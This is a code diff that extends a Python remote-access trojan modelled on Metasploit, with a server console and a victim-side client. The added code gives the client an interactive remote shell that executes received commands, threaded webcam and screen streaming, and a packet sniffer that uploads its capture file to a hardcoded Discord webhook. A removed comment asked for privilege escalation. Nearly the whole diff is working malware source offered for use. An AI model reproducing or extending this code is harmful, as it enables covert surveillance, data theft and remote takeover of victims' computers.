@@ -1,19 +1,40 @@
 import socket
 import threading
 import time
+import subprocess
 from flask import Flask, Response, render_template_string, request
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
-import signal
-import sys
-from pynput import keyboard  # Knihovna pro detekci kláves
+from pynput import keyboard
 
 init(autoreset=True)
 
 app = Flask(__name__)
 server_thread = None
 stop_server_flag = threading.Event()
+ctrl_pressed = False  
+
+def on_press(key):
+    global ctrl_pressed
+    try:
+        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+            ctrl_pressed = True  
+        elif key.char == 'p' and ctrl_pressed:  
+            print(Fore.RED + "[ * ] CTRL+P detected! Stopping server...")
+            stop_server()
+            return False  
+    except AttributeError:
+        pass
+
+def on_release(key):
+    global ctrl_pressed
+    if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+        ctrl_pressed = False  
+
+def listen_for_ctrl_p():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
 html_template = """
 <!DOCTYPE html>
@@ -67,22 +88,32 @@ def generate_frames(client_socket):
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
     print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")
+
     while True:
         try:
             command = input(Fore.MAGENTA + "medusa > ")
         except EOFError:
             break
 
-        if command == "hashdump":
-            print(Fore.YELLOW + "[ * ] Dumping password hashes...")
-        
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
-        
-        if command == "CTRL+P":  # Tento příkaz již není třeba, klávesová zkratka to řeší
+
+        if command == "CTRL+P":  
             print(Fore.RED + "[ * ] Server will be stopped after CTRL+P")
             continue
-        
+
+        if command == "shell":
+            print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
+            while True:
+                shell_command = input(Fore.CYAN + "shell > ")
+                if shell_command.lower() == "exit":
+                    print(Fore.YELLOW + "[ * ] Exiting shell mode.")
+                    break
+                client_socket.send(shell_command.encode('utf-8'))
+                output = client_socket.recv(4096).decode('utf-8')
+                print(Fore.WHITE + output)
+            continue
+
         client_socket.send(command.encode('utf-8'))
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
             mode = command.split('_')[0]
@@ -95,22 +126,6 @@ def stop_server():
         raise RuntimeError('Not running with the Werkzeug Server')
     func()
 
-# Funkce pro detekci stisknutí CTRL+P
-def on_press(key):
-    try:
-        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:  # Pokud je stisknutý CTRL
-            pass
-        if key.char == 'p' and keyboard.Listener._pressed[keyboard.Key.ctrl_l]:  # Pokud je stisknutý CTRL + P
-            print(Fore.RED + "[ * ] CTRL+P detected! Stopping server...")
-            stop_server()
-            return False  # Zastavit listener
-    except AttributeError:
-        pass
-
-def listen_for_ctrl_p():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()  # Bude čekat na stisknutí klávesy
-
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
@@ -118,7 +133,6 @@ def main():
     print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
     print(Fore.GREEN + "[ * ] Listening for incoming connections...")
 
-    # Spustit detekci CTRL+P v samostatném vlákně
     keyboard_thread = threading.Thread(target=listen_for_ctrl_p)
     keyboard_thread.start()
 
@@ -131,14 +145,17 @@ def main():
 if __name__ == "__main__":
     main()
 
-    
+
 #client
 
-#this is the client add here the functionality to escalate privileges                                                                                                                                      
 import socket
 import cv2
 import pyautogui
 import numpy as np
+import scapy.all as scapy
+import threading
+import requests
+import subprocess
 
 def webcam_stream(client_socket):
     cap = cv2.VideoCapture(0)
@@ -157,6 +174,30 @@ def screen_stream(client_socket):
         _, buffer = cv2.imencode('.jpg', frame)
         client_socket.sendall(buffer.tobytes())
 
+def sniffer_start():
+    def sniff_and_save(pkt):
+        scapy.wrpcap('target.cap', pkt, append=True)
+    
+    iface = scapy.conf.iface
+    scapy.sniff(iface=iface, timeout=60, prn=sniff_and_save)
+
+    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
+    with open('target.cap', 'rb') as f:
+        requests.post(webhook_url, files={'file': f})
+
+def shell(client_socket):
+    while True:
+        command = client_socket.recv(1024).decode('utf-8')
+        if command.lower() == "exit":
+            break
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+        except subprocess.CalledProcessError as e:
+            output = e.output
+        if not output:
+            output = "Command executed, but no output."
+        client_socket.send(output.encode('utf-8'))
+
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect(('server_ip', 9999))
@@ -164,9 +205,16 @@ def main():
     while True:
         command = client_socket.recv(1024).decode('utf-8')
         if command == "webcam_stream":
-            webcam_stream(client_socket)
+            webcam_thread = threading.Thread(target=webcam_stream, args=(client_socket,))
+            webcam_thread.start()
         elif command == "screen_stream":
-            screen_stream(client_socket)
+            screen_thread = threading.Thread(target=screen_stream, args=(client_socket,))
+            screen_thread.start()
+        elif command == "sniffer_start":
+            sniffer_thread = threading.Thread(target=sniffer_start)
+            sniffer_thread.start()
+        elif command == "shell":
+            shell(client_socket)
 
 if __name__ == "__main__":
     main()
